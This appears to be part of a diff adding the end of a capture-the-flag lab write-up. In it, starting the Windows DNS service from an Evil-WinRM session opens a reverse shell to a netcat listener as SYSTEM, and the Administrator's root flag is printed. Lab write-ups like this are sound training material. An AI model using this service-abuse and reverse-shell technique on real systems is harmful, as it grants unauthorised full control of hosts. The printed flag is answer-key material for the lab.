+        WIN32_EXIT_CODE    : 0  (0x0)
+        SERVICE_EXIT_CODE  : 0  (0x0)
+        CHECKPOINT         : 0x0
+        WAIT_HINT          : 0x0
+*Evil-WinRM* PS C:\Users\ryan\Documents> sc.exe start dns
+
+SERVICE_NAME: dns
+        TYPE               : 10  WIN32_OWN_PROCESS
+        STATE              : 2  START_PENDING
+                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
+        WIN32_EXIT_CODE    : 0  (0x0)
+        SERVICE_EXIT_CODE  : 0  (0x0)
+        CHECKPOINT         : 0x0
+        WAIT_HINT          : 0x7d0
+        PID                : 1964
+        FLAGS              :
+*Evil-WinRM* PS C:\Users\ryan\Documents>
+
+
+```
+
+and looking at our listener
+
+```shell
+#nc -lvnp 1231
+listening on [any] 1231 ...
+connect to [10.10.14.201] from (UNKNOWN) [10.10.10.169] 54770
+Microsoft Windows [Version 10.0.14393]
+(c) 2016 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami
+whoami
+nt authority\system
+
+C:\Windows\system32>cd C:\Users\Administrator\Desktop
+cd C:\Users\Administrator\Desktop
+
+C:\Users\Administrator\Desktop>type root.txt
+type root.txt
+e1d94876a506850d0c20edb5405e619c
+C:\Users\Administrator\Desktop>
+
+```
+
+We got root !
+
+
+
+G
